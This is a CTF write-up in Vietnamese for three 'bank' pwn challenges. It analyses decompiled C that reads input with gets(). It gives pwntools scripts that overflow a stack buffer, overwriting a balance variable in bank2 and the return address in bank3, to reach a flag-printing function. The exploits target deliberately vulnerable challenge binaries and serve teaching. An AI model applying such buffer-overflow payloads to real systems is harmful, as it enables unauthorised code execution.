# **bank 1**

## bài này không có file thực thi nên mình thử lỗi bufferoverflow nhập một số chữ A và đã leak được luôn flag
### (do khi viết write up server đã đóng nên không có hình minh họa)


# **bank 2**

## Task
nc 61.28.237.24 30203

file: bank2
## Solution

### load file bank2 lên IDA pro và phân tích

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setbuf(stdout, 0);
  Register();
  puts("[+] Good bye!");
  return 0;
}
```

```c
void Register()
{
  char name[64]; // [esp+Ch] [ebp-4Ch] BYREF
  int balance; // [esp+4Ch] [ebp-Ch]

  balance = 0;
  printf("[+] Please enter your name: ");
  gets(name);
  printf("[+] Thanks for the registration, your balance is %d.\n", balance);
  if ( balance == 0x66A44 )
    getFlag();

```

```c
void getFlag()
{
  system("cat flag.txt");
}
```
Hàm `main` sẽ gọi hàm `Register`, nên ta sẽ tập trung phân tích hàm này

để `Register` gọi được hàm  `getFlag` in ra flag thì biến `balance` phải bằng `0x66A44` 

Vào stack của hàm này để xem

![image](https://user-images.githubusercontent.com/31529599/120002219-ca34fa00-bffe-11eb-91f7-4515849f7060.png)

ta thấy biến name nhập vào là chuỗi và có địa chỉ lớn hơn địa chỉ của biến `balance`. Nên bài này chỉ đơn giản là bufer overflow để ghi đề local stack

## Sử dụng pwntool python để khai thác
### vì server đã đóng nên mình sẽ khai thác local với file flag.txt nội dung HCMUSCTF{bank2}

```python
from pwn import *

binary = context.binary = ELF('./bank2')

p = process('./bank2')
#p = remote('61.28.237.24','30203')

payload = b'A'*(0x4c-0xc)

payload += p32(0x66A44)

p.sendline(payload)

f = open('solve.txt','wb')
f.write(payload)

p.interactive()
```
với `0x4c-0xc` là khoảng cách giữa biến `name` và biến `balance`

# Chạy script python
![image](https://user-images.githubusercontent.com/31529599/120003897-5c89cd80-c000-11eb-9aa7-5f6883126e06.png)
Xong !


# **bank 3*

## Task:
nc 61.28.237.24 30204
File: bank3

## Solution
Tương tự như `bank2` bài này cũng tập trung phân tích hàm `Register`

```c
void Register()
{
  char name[64]; // [esp+Ch] [ebp-4Ch] BYREF
  int balance; // [esp+4Ch] [ebp-Ch]

  balance = 0;
  printf("[+] Please enter your name: ");
  gets(name);
  printf("[+] Thanks for the registration, your balance is %d.\n", balance);
}
```
```c
void getFlag()
{
  system("cat flag.txt");
}
```

Bài này thì hàm `Register` không trực tiếp gọi hàm `getFlag` nên chúng ta sẽ thực hiện ghi đè địa chỉ trả về của hàm `Register` này thành địa chỉ của hàm `getFlag` để chương trình gọi hàm `getFlag`

## Exploit (code python)
![image](https://user-images.githubusercontent.com/31529599/120053869-d8166980-c056-11eb-9acf-c403cfc543fa.png)

```python
from pwn import *

binary = context.binary = ELF('./bank3')

#p = remote('61.28.237.24','30204')
p = process('./bank3')

payload = b'A'*(0x4c+0x4)
payload += p32(binary.sym.getFlag)
p.sendline(payload)

p.interactive()
```

với `0x4c+0x4` và khoảng cách giữa biến `name` với return address

# Run scripts
Khi biết write up thì server đã đóng nên mình tạo 1 file flag.txt nội dung HCMUSCTF{bank3} để khai thác local
![image](https://user-images.githubusercontent.com/31529599/120053945-5410b180-c057-11eb-9f10-13bfc1baa3fb.png)

Thành công!


